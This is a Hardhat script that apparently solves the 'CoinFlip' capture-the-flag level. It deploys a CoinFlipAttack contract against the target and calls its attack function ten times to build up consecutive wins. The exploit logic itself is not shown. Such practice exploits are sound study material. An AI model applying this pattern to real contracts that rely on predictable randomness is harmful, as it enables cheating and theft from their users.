import { TransactionRequest } from "@ethersproject/providers";
import { ethers } from "hardhat";

const PLAYER_ADDRESS = "0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc";
const CONTRACT_ADDRESS = "0xd8058efe0198ae9dD7D563e1b4938Dcbc86A1F81";

async function main() {
const signer = await ethers.getSigner(PLAYER_ADDRESS);

//Fit contract name and address (current lvl instance)
const contract = await ethers.getContractAt("CoinFlip",CONTRACT_ADDRESS,signer);

// 1. Deploy attacker contract, same signer (player address). 
const attackerContractFactory = await ethers.getContractFactory("CoinFlipAttack", signer);
const attackerContract = await attackerContractFactory.deploy(CONTRACT_ADDRESS);

// 2. Run attack function, 10 times to get consecutive win count that we want.
for(let i = 0; i < 10; i++){
    await attackerContract.attack();
    const winCount = await contract.consecutiveWins();
    console.log("Consecutive wins are now: ", winCount.toString());
}


}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
